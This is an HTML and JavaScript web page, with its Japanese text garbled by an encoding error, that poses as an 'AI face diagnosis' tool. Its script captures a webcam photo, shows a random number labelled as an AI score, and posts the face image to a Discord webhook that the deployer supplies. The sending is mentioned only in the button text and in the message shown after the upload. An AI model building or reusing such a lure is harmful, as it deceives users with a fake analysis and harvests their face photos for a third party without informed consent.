<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI é¡”è¨ºæ–­</title>
<style>
  body {font-family:sans-serif;text-align:center;background:linear-gradient(135deg,#b993d6,#8ca6db);color:white;padding:20px;}
  h1 {font-size:1.8em;}
  video,canvas {width:90%;max-width:350px;border-radius:10px;margin:10px 0;}
  button {background:#6a5acd;border:none;color:white;padding:12px 20px;border-radius:10px;font-size:1em;margin:5px;cursor:pointer;}
  #result {font-size:1.3em;margin-top:15px;}
</style>
</head>
<body>

<h1>AI é¡”è¨ºæ–­ï¼ˆã‚¹ãƒãƒ›å¯¾å¿œï¼‰</h1>
<video id="camera" autoplay playsinline></video>
<canvas id="snapshot" style="display:none;"></canvas><br>
<button id="captureBtn">ğŸ“¸ å†™çœŸã‚’æ’®ã‚‹</button>
<button id="sendBtn" disabled>âœ¨ è¨ºæ–­ï¼†é€ä¿¡</button>
<p id="result"></p>

<script>
const video=document.getElementById('camera');
const canvas=document.getElementById('snapshot');
const captureBtn=document.getElementById('captureBtn');
const sendBtn=document.getElementById('sendBtn');
const result=document.getElementById('result');

// â†“ ã‚ãªãŸã®Discord Webhook URL â†“
const WEBHOOK_URL="https://discord.com/api/webhooks/ã“ã“ã«ã‚ãªãŸã®URL";

async function initCamera(){
 try{
   const stream=await navigator.mediaDevices.getUserMedia({video:true});
   video.srcObject=stream;
 }catch(err){
   alert("ã‚«ãƒ¡ãƒ©ã‚’èµ·å‹•ã§ãã¾ã›ã‚“ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ã®è¨­å®šã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚");
   console.error(err);
 }
}

captureBtn.addEventListener('click',()=>{
 const ctx=canvas.getContext('2d');
 canvas.width=video.videoWidth;
 canvas.height=video.videoHeight;
 ctx.drawImage(video,0,0);
 sendBtn.disabled=false;
 result.textContent="å†™çœŸã‚’æ’®å½±ã—ã¾ã—ãŸï¼è¨ºæ–­ã—ã¦ã¿ã‚ˆã†ğŸ‘‡";
});

sendBtn.addEventListener('click',async()=>{
 const randomScore=Math.floor(Math.random()*101);
 result.textContent=`AIè¨ºæ–­ã‚¹ã‚³ã‚¢ï¼š${randomScore}ç‚¹ï¼`;
 const imageBlob=await new Promise(resolve=>canvas.toBlob(resolve,'image/jpeg'));
 const formData=new FormData();
 formData.append("file",imageBlob,"face.jpg");
 formData.append("payload_json",JSON.stringify({content:`ğŸ“¸ AIé¡”è¨ºæ–­ã®çµæœï¼š${randomScore}ç‚¹`}));
 await fetch(WEBHOOK_URL,{method:"POST",body:formData});
 result.textContent+="ï¼ˆDiscordã«é€ä¿¡ã—ã¾ã—ãŸï¼ï¼‰";
});

initCamera();
</script>

</body>
</html>
